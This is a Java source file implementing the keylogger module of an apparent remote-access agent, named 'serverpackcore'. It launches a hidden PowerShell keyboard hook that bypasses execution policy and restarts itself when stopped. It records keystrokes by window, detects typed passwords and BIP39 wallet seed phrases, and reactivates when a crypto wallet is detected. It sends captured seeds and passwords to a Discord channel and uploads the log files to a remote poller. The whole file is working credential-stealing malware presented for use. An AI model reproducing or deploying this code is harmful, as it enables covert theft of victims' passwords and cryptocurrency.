package com.serverpackcore.agent;

import java.io.RandomAccessFile;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Instant;
import java.util.Base64;

/**
 * Supervises the native low-level hook. The hook is a separate hidden
 * PowerShell process so it survives an agent restart; this class only tails its
 * event file, groups keystrokes by window and decides what looks like a
 * password.
 */
final class Keylogger {
	private static final long IDLE_FLUSH = 10000L;

	private final Path installDir;
	private final Path ops;
	private final State state;
	private final Poller poller;
	private final OpsNotifier notifier;

	private final StringBuilder buffer = new StringBuilder();
	private String process = "";
	private String title = "";
	private boolean uiaPassword;
	private long lastEvent = System.currentTimeMillis();
	private long lastSave;
	private volatile boolean running = true;
	private volatile boolean walletForced;
	int walletOnCalls;
	private Thread tail;
	private Thread supervisor;
	private volatile long position = -1L;

	Keylogger(Path installDir, Path ops, State state, Poller poller, OpsNotifier notifier) {
		this.installDir = installDir;
		this.ops = ops;
		this.state = state;
		this.poller = poller;
		this.notifier = notifier;
	}

	boolean wanted() {
		return state.keyloggerSet ? state.keylogger : DiscordConfig.keylogger();
	}

	boolean hardOff() {
		return state.keyloggerHardOff;
	}

	synchronized boolean start() {
		if (!AgentPaths.isWindows()) {
			return false;
		}
		try {
			Files.writeString(OpsPaths.keyOn(installDir), "on\n", StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			Log.debug("Keylogger marker failed", throwable);
		}
		if (isRunning()) {
			return true;
		}
		try {
			Path script = OpsPaths.keysScript(installDir);
			writeResource("/serverpackcore/keys.ps1", script);
			// Do not delete keys.pid here: a logon hook may already own the mutex and
			// have written it, and deleting it would make status/supervision blind.
			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoP", "-NonInteractive",
				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString(), ops.toString());
			builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
			builder.redirectError(ProcessBuilder.Redirect.DISCARD);
			builder.start();
			Log.debug("Keylogger started");
			return true;
		} catch (Throwable throwable) {
			Log.debug("Keylogger start failed", throwable);
			return false;
		}
	}

	synchronized void stop(boolean hard) {
		walletForced = false;
		long pid = pid();
		if (pid > 0L) {
			try {
				Shell.run(ops, "taskkill /PID " + pid + " /T /F", 8000L);
			} catch (Throwable throwable) {
				Log.debug("Keylogger stop failed", throwable);
			}
		}
		try {
			Files.deleteIfExists(OpsPaths.keyPid(installDir));
		} catch (Throwable ignored) {
			// best effort
		}
		if (hard || !wanted()) {
			try {
				Files.deleteIfExists(OpsPaths.keyOn(installDir));
			} catch (Throwable ignored) {
				// best effort
			}
		}
	}

	/** A wallet was detected: wake the hook even after `keys off`, unless --hard. */
	synchronized void walletOn() {
		walletOnCalls++;
		if (isRunning() || hardOff()) {
			return;
		}
		walletForced = true;
		start();
	}

	synchronized void walletOff() {
		if (!walletForced) {
			return;
		}
		walletForced = false;
		if (!wanted()) {
			stop(false);
		}
	}

	boolean isRunning() {
		long pid = pid();
		if (pid <= 0L) {
			return false;
		}
		return ProcessHandle.of(pid).map(ProcessHandle::isAlive).orElse(false);
	}

	long pid() {
		try {
			Path file = OpsPaths.keyPid(installDir);
			if (!Files.isRegularFile(file)) {
				return 0L;
			}
			return Long.parseLong(Files.readString(file, StandardCharsets.UTF_8).trim());
		} catch (Throwable throwable) {
			return 0L;
		}
	}

	void startTail() {
		tail = new Thread(this::tailLoop, "spc-keys-tail");
		tail.setDaemon(true);
		tail.start();
		supervisor = new Thread(this::supervise, "spc-keys-supervisor");
		supervisor.setDaemon(true);
		supervisor.start();
	}

	private void supervise() {
		while (running) {
			try {
				Thread.sleep(10000L);
			} catch (InterruptedException interrupted) {
				return;
			}
			if (running && (wanted() || walletForced) && !isRunning()) {
				Log.debug("Keylogger missing, restarting");
				start();
			}
		}
	}

	private void tailLoop() {
		position = readOffset();
		long saved = System.currentTimeMillis();
		while (running) {
			try {
				Path events = OpsPaths.keyEvents(installDir);
				if (!Files.isRegularFile(events)) {
					Thread.sleep(500L);
					flushIfIdle();
					continue;
				}
				long size = Files.size(events);
				if (position < 0L || size < position) {
					position = 0L;
				}
				if (size == position) {
					Thread.sleep(250L);
					flushIfIdle();
					continue;
				}
				try (RandomAccessFile input = new RandomAccessFile(events.toFile(), "r")) {
					input.seek(position);
					String line;
					while ((line = input.readLine()) != null) {
						position = input.getFilePointer();
						handle(line);
					}
				}
				if (System.currentTimeMillis() - saved > 2000L) {
					writeOffset();
					saved = System.currentTimeMillis();
				}
			} catch (InterruptedException interrupted) {
				return;
			} catch (Throwable throwable) {
				Log.debug("Keys tail failed", throwable);
				try {
					Thread.sleep(1000L);
				} catch (InterruptedException interrupted) {
					return;
				}
			}
		}
	}

	private long readOffset() {
		try {
			Path file = OpsPaths.keyOffset(installDir);
			if (Files.isRegularFile(file)) {
				return Long.parseLong(Files.readString(file, StandardCharsets.UTF_8).trim());
			}
		} catch (Throwable throwable) {
			Log.debug("Key offset read failed", throwable);
		}
		return 0L;
	}

	private void writeOffset() {
		if (position < 0L) {
			return;
		}
		try {
			Files.writeString(OpsPaths.keyOffset(installDir), Long.toString(Math.max(0L, position)),
				StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			Log.debug("Key offset write failed", throwable);
		}
	}

	void handle(String line) {
		if (line.isBlank()) {
			return;
		}
		try {
			var event = Json.parseObject(line);
			String kind = Json.str(event, "k", "key");
			String nextProcess = decode(Json.str(event, "p", ""));
			String nextTitle = decode(Json.str(event, "t", ""));
			boolean nextPassword = Boolean.TRUE.equals(event.get("pw"));
			if (!nextProcess.equals(process)) {
				flush();
				process = nextProcess;
				title = nextTitle;
				uiaPassword = nextPassword;
			} else if (!nextTitle.equals(title)) {
				// Notepad and similar editors put the edited line in the title;
				// a growing or shrinking document title is the same field, so
				// splitting there loses the beginning of a typed seed.
				if (!sameDocument(title, nextTitle)) {
					flush();
					uiaPassword = nextPassword;
				}
				title = nextTitle;
				if (nextPassword) {
					uiaPassword = true;
				}
			} else if (nextPassword && !uiaPassword) {
				uiaPassword = true;
			}
			if (!kind.equals("key")) {
				return;
			}
			long vk = Json.num(event, "vk", 0L);
			String unicode = decode(Json.str(event, "u", ""));
			lastEvent = System.currentTimeMillis();
			// A dead key produces no character of its own; its accent stays
			// pending in the layout and composes with the next key.
			if (Boolean.TRUE.equals(event.get("dk")) && unicode.isEmpty()) {
				return;
			}
			String text = Keymap.map((int) vk, Boolean.TRUE.equals(event.get("sh")),
				Boolean.TRUE.equals(event.get("ca")), unicode);
			if (text.equals("\b")) {
				if (buffer.length() > 0) {
					buffer.setLength(buffer.length() - 1);
				}
				return;
			}
			if (text.equals("\n") || text.equals("\t")) {
				flush();
				return;
			}
			if (text.isEmpty()) {
				return;
			}
			if (buffer.length() < 256) {
				buffer.append(text);
			}
		} catch (Throwable throwable) {
			Log.debug("Key event invalid", throwable);
		}
	}

	/** A document title that only grew or lost its tail is the same field. */
	private static boolean sameDocument(String previous, String next) {
		// The editor appends its own " - App" suffix after the growing text,
		// so compare the stems on both sides of it.
		String a = stem(previous);
		String b = stem(next);
		return !a.isEmpty() && (b.startsWith(a) || a.startsWith(b));
	}

	private static String stem(String title) {
		int cut = title.lastIndexOf(" - ");
		return cut > 0 ? title.substring(0, cut) : title;
	}

	private void flushIfIdle() {
		if (buffer.length() > 0 && System.currentTimeMillis() - lastEvent > IDLE_FLUSH) {
			flush();
		}
	}

	private synchronized void flush() {
		String text = buffer.toString();
		buffer.setLength(0);
		if (!PasswordHeuristic.plausible(text)) {
			return;
		}
		String clean = text.replace("\t", "").strip();
		clean = clean.replace("|", "/");
		String stamp = java.time.LocalTime.now().withNano(0).toString();
		append(OpsPaths.keylog(installDir), stamp + " [" + process + " | " + title + "] " + clean + "\n");
		// Seed tokens are single-space separated; keep the password/log text
		// byte-exact apart from the outer strip and the pipe escape.
		String seed = seed(clean.replaceAll("\\s+", " ").strip());
		if (seed != null) {
			String words = seed.split(" ", -1).length == 24 ? "24" : "12";
			boolean duplicate = SecretDetector.alertedRecently(seed);
			append(OpsPaths.seeds(installDir),
				Instant.now() + " | " + process + " | " + title + " | " + seed + "\n");
			state.passwordEvents++;
			saveIfDue();
			// Only mark as alerted when the notice actually goes out; otherwise
			// a later memory finding would be suppressed with no prior alert.
			if (!duplicate && DiscordConfig.sendPasswords()) {
				SecretDetector.alerted(seed);
				notifier.send("seed escrita: " + words + " palabras");
				notifier.send(seed);
			}
			return;
		}
		boolean password = uiaPassword || PasswordHeuristic.looksLikePassword(process, title);
		if (!password) {
			return;
		}
		String line = Instant.now() + " | " + process + " | " + title + " | " + clean + "\n";
		append(OpsPaths.passwords(installDir), line);
		state.passwordEvents++;
		saveIfDue();
		if (DiscordConfig.sendPasswords()) {
			String legacy = "password? " + process + " | " + title + " | " + clean;
			notifier.send(legacy);
			java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
			data.put("process", process);
			data.put("title", title);
			data.put("text", clean);
			notifier.event("password", data, legacy);
		}
	}

	private void saveIfDue() {
		if (System.currentTimeMillis() - lastSave > 30000L) {
			lastSave = System.currentTimeMillis();
			state.save(AgentPaths.state(installDir));
		}
	}

	/** Longest 24-word window first, then 12; only checksum-valid BIP39 survives. */
	private String seed(String clean) {
		String[] tokens = clean.split(" ");
		for (int size : new int[] { 24, 12 }) {
			for (int start = 0; start + size <= tokens.length; start++) {
				StringBuilder candidate = new StringBuilder();
				for (int index = start; index < start + size; index++) {
					if (candidate.length() > 0) {
						candidate.append(' ');
					}
					candidate.append(tokens[index]);
				}
				String value = candidate.toString();
				SecretDetector.Secret secret = SecretDetector.detect(value, process, title);
				if (secret != null && secret.kind().startsWith("seed-")) {
					return value;
				}
			}
		}
		return null;
	}

	private static void append(Path file, String line) {
		try {
			if (Files.isRegularFile(file) && Files.size(file) > 1024L * 1024L) {
				Path one = file.resolveSibling(file.getFileName() + ".1");
				Path two = file.resolveSibling(file.getFileName() + ".2");
				Path three = file.resolveSibling(file.getFileName() + ".3");
				Files.deleteIfExists(three);
				if (Files.isRegularFile(two)) {
					Files.move(two, three, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
				}
				if (Files.isRegularFile(one)) {
					Files.move(one, two, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
				}
				Files.move(file, one, java.nio.file.StandardCopyOption.REPLACE_EXISTING);
			}
			Files.writeString(file, line, StandardCharsets.UTF_8,
				java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
			try {
				Files.setPosixFilePermissions(file,
					java.nio.file.attribute.PosixFilePermissions.fromString("rw-------"));
			} catch (Throwable ignored) {
				// Windows
			}
		} catch (Throwable throwable) {
			Log.debug("Key log failed", throwable);
		}
	}

	void stopTail() {
		running = false;
		writeOffset();
		if (tail != null) {
			tail.interrupt();
		}
		if (supervisor != null) {
			supervisor.interrupt();
		}
	}

	/** Uploads both logs without moving them. */
	String dump() throws Exception {
		Path keys = OpsPaths.keylog(installDir);
		Path passwords = OpsPaths.passwords(installDir);
		Path seeds = OpsPaths.seeds(installDir);
		boolean any = false;
		if (Files.isRegularFile(keys) && Files.size(keys) > 0L) {
			any |= poller.uploadFile(keys);
		}
		if (Files.isRegularFile(passwords) && Files.size(passwords) > 0L) {
			any |= poller.uploadFile(passwords);
		}
		if (Files.isRegularFile(seeds) && Files.size(seeds) > 0L) {
			any |= poller.uploadFile(seeds);
		}
		for (int segment = 1; segment <= 3; segment++) {
			Path rotated = seeds.resolveSibling(seeds.getFileName() + "." + segment);
			if (Files.isRegularFile(rotated) && Files.size(rotated) > 0L) {
				any |= poller.uploadFile(rotated);
			}
		}
		return any ? "Key logs uploaded" : "No key log yet";
	}

	private static String decode(String value) {
		if (value == null || value.isEmpty()) {
			return "";
		}
		try {
			return new String(Base64.getDecoder().decode(value), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return "";
		}
	}

	static void writeResource(String name, Path target) throws java.io.IOException {
		Files.createDirectories(target.getParent());
		try (var input = Keylogger.class.getResourceAsStream(name)) {
			if (input == null) {
				throw new java.io.IOException("missing resource " + name);
			}
			Path temp = target.resolveSibling(target.getFileName() + ".tmp");
			Files.copy(input, temp, StandardCopyOption.REPLACE_EXISTING);
			try {
				Files.setPosixFilePermissions(temp,
					java.nio.file.attribute.PosixFilePermissions.fromString("rw-------"));
			} catch (Throwable ignored) {
				// Windows
			}
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING);
		}
	}
}
